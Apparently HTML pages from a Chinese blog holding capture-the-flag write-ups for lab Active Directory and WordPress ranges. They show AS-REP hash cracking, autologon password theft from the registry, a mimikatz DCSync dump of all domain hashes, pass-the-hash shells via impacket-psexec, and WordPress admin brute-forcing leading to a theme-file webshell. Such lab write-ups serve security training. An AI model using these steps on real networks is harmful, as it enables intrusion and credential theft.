KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></pre></td></tr></table></figure>

<p>可以得到了两个用户的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa</span><br><span class="line"></span><br><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用hashcat爆破一下<code>└─# hashcat -m 18200 passhash  /usr/share/wordlists/rockyou.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa:hellokitty</span><br><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0:strawberry</span><br></pre></td></tr></table></figure>

<p><code>wenshao:hellokitty</code>、<code>zhangxin:strawberry</code></p>
<p>用bloodhound进行信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# bloodhound-python -u zhangxin -p strawberry -d xiaorang.lab -dc DC-PROGAME.xiaorang.lab -c all --dns-tcp -ns 172.22.6.12 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time2.png"></p>
<p>借一张大佬的图，可以看到WIN2019.XIAORANG.LAB到<a href="mailto:&#89;&#x55;&#x58;&#85;&#65;&#x4e;&#x40;&#x58;&#x49;&#65;&#79;&#x52;&#65;&#78;&#71;&#46;&#76;&#65;&#66;">&#89;&#x55;&#x58;&#85;&#65;&#x4e;&#x40;&#x58;&#x49;&#65;&#79;&#x52;&#65;&#78;&#71;&#46;&#76;&#65;&#66;</a>是有HasSession的，</p>
<p>HasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan这个用户登录过WIN2019</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time3.png"></p>
<p>可以直接查看注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\zhangxin\Desktop&gt;reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">    AutoRestartShell    REG_DWORD    0x1</span><br><span class="line">    Background    REG_SZ    0 0 0</span><br><span class="line">    CachedLogonsCount    REG_SZ    10</span><br><span class="line">    DebugServerCommand    REG_SZ    no</span><br><span class="line">    DisableBackButton    REG_DWORD    0x1</span><br><span class="line">    EnableSIHostIntegration    REG_DWORD    0x1</span><br><span class="line">    ForceUnlockLogon    REG_DWORD    0x0</span><br><span class="line">    LegalNoticeCaption    REG_SZ</span><br><span class="line">    LegalNoticeText    REG_SZ</span><br><span class="line">    PasswordExpiryWarning    REG_DWORD    0x5</span><br><span class="line">    PowerdownAfterShutdown    REG_SZ    0</span><br><span class="line">    PreCreateKnownFolders    REG_SZ    &#123;A520A1A4-1780-4FF6-BD18-167343C5AF16&#125;</span><br><span class="line">    ReportBootOk    REG_SZ    1</span><br><span class="line">    Shell    REG_SZ    explorer.exe</span><br><span class="line">    ShellCritical    REG_DWORD    0x0</span><br><span class="line">    ShellInfrastructure    REG_SZ    sihost.exe</span><br><span class="line">    SiHostCritical    REG_DWORD    0x0</span><br><span class="line">    SiHostReadyTimeOut    REG_DWORD    0x0</span><br><span class="line">    SiHostRestartCountLimit    REG_DWORD    0x0</span><br><span class="line">    SiHostRestartTimeGap    REG_DWORD    0x0</span><br><span class="line">    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,</span><br><span class="line">    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile</span><br><span class="line">    WinStationsDisabled    REG_SZ    0</span><br><span class="line">    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe</span><br><span class="line">    scremoveoption    REG_SZ    0</span><br><span class="line">    DisableCAD    REG_DWORD    0x1</span><br><span class="line">    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15</span><br><span class="line">    ShutdownFlags    REG_DWORD    0x80000027</span><br><span class="line">    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180</span><br><span class="line">    LastUsedUsername    REG_SZ    yuxuan</span><br><span class="line">    AutoAdminLogon    REG_SZ    1</span><br><span class="line">    DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">    DefaultDomainName    REG_SZ    xiaorang.lab</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserName    REG_SZ    yuxuan</span><br><span class="line"> DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line"> DefaultDomainName    REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure>

<p>yuxuan用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限</p>
<p>先登录yuxuan用户，然后用mimikatz抓取administrator的哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yuxuan\Desktop&gt;mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC-PROGAME.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512</span><br><span class="line">1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512</span><br><span class="line">1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512</span><br><span class="line">1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512</span><br><span class="line">1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512</span><br><span class="line">1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512</span><br><span class="line">1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512</span><br><span class="line">1111    wenbo   9abb7115997ea03785e92542f684bdde        512</span><br><span class="line">1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512</span><br><span class="line">1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512</span><br><span class="line">1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512</span><br><span class="line">1117    weicheng        796a774eace67c159a65d6b86fea1d01        512</span><br><span class="line">1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512</span><br><span class="line">1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512</span><br><span class="line">1120    jizhen  1840c5130e290816b55b4e5b60df10da        512</span><br><span class="line">1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512</span><br><span class="line">1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512</span><br><span class="line">1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512</span><br><span class="line">1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512</span><br><span class="line">1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512</span><br><span class="line">1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512</span><br><span class="line">1127    chouqian        c6f0585b35de1862f324bc33c920328d        512</span><br><span class="line">1128    jicheng 159ee55f1626f393de119946663a633c        512</span><br><span class="line">1129    xiyi    ee146df96b366efaeb5138832a75603b        512</span><br><span class="line">1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512</span><br><span class="line">1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512</span><br><span class="line">1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512</span><br><span class="line">1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512</span><br><span class="line">1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512</span><br><span class="line">1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512</span><br><span class="line">1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512</span><br><span class="line">1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512</span><br><span class="line">1138    gaijin  b1040198d43631279a63b7fbc4c403af        512</span><br><span class="line">1139    yifu    4836347be16e6af2cd746d3f934bb55a        512</span><br><span class="line">1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512</span><br><span class="line">1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512</span><br><span class="line">1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512</span><br><span class="line">1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512</span><br><span class="line">1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512</span><br><span class="line">1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512</span><br><span class="line">1147    lili    b290a36500f7e39beee8a29851a9f8d5        512</span><br><span class="line">1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512</span><br><span class="line">1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512</span><br><span class="line">1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512</span><br><span class="line">1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512</span><br><span class="line">1152    langying        52a8a125cd369ab16a385f3fcadc757d        512</span><br><span class="line">1153    diaocai a14954d5307d74cd75089514ccca097a        512</span><br><span class="line">1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512</span><br><span class="line">1155    manxue  0255c42d9f960475f5ad03e0fee88589        512</span><br><span class="line">1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512</span><br><span class="line">1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512</span><br><span class="line">1158    louyou  a97ba112b411a3bfe140c941528a4648        512</span><br><span class="line">1159    maqun   485c35105375e0754a852cee996ed33b        512</span><br><span class="line">1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512</span><br><span class="line">1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512</span><br><span class="line">1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512</span><br><span class="line">1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512</span><br><span class="line">1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512</span><br><span class="line">1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512</span><br><span class="line">1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512</span><br><span class="line">1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512</span><br><span class="line">1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512</span><br><span class="line">1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512</span><br><span class="line">1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512</span><br><span class="line">1172    dujian  8f7846c78f03bf55685a697fe20b0857        512</span><br><span class="line">1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512</span><br><span class="line">1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512</span><br><span class="line">1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512</span><br><span class="line">1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512</span><br><span class="line">1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512</span><br><span class="line">502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514</span><br><span class="line">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512</span><br><span class="line">1000    DC-PROGAME$     b1f83a8f5daf6f7825f6a69d98c8f364        532480</span><br><span class="line">1180    yuxuan  376ece347142d1628632d440530e8eed        66048</span><br><span class="line">1181    WIN2019$        5447da4f138ae51f887cf24e79a9eba3        4096</span><br><span class="line">1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352</span><br><span class="line">1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>有了administrator的密码了，就相当于控制域控了，登录一下其他的机器type flag就行了</p>
<h1 id="FLAG3、4"><a href="#FLAG3、4" class="headerlink" title="FLAG3、4"></a>FLAG3、4</h1><p>flag03在172.22.6.25的C:\Users\Administrator\flag\下</p>
<p>flag04在172.22.6.12的C:\Users\Administrator\flag\下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.12  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.6.12.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file FFcjQxtS.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.6.12.....</span><br><span class="line">[*] Creating service kiNB on 172.22.6.12.....</span><br><span class="line">[*] Starting service kiNB.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [版本 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.25  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.22.6.25.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file GRqsuULo.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.6.25.....</span><br><span class="line">[*] Creating service VUIl on 172.22.6.25.....</span><br><span class="line">[*] Starting service VUIl.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [版本 10.0.17763.3046]</span><br><span class="line">(c) 2018 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag*</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/" class="post-title-link" itemprop="url">春秋云镜-2022网鼎杯半决赛复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-02 14:04:44 / 修改时间：20:17:12" itemprop="dateCreated datePublished" datetime="2025-04-02T14:04:44+08:00">2025-04-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>17 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 39.98.112.16 -p-</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDT</span><br><span class="line">Nmap scan report for 39.98.112.16</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds</span><br></pre></td></tr></table></figure>

<p>只开了一个 22 端口和 80 端口</p>
<p>访问 80 端口，很明显的 wordpress 框架</p>
<p>用 wpscan 扫描可以扫描到一个 admin 用户，爆破密码可以爆破出来 admin 的密码是 123456</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: 123456</span><br></pre></td></tr></table></figure>

<p>进入后台之后修改主题文件 getshell</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%981.png"></p>
<p>访问/wp-content/themes/twentytwentyone/404.php，蚁剑连接</p>
<p>flag01 在根目录</p>
<p>查看网络信息，然后上传 fscan 进行内网扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 :: 1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff</span><br><span class="line">    inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 1892159075sec preferred_lft 1892159075sec</span><br><span class="line">    inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

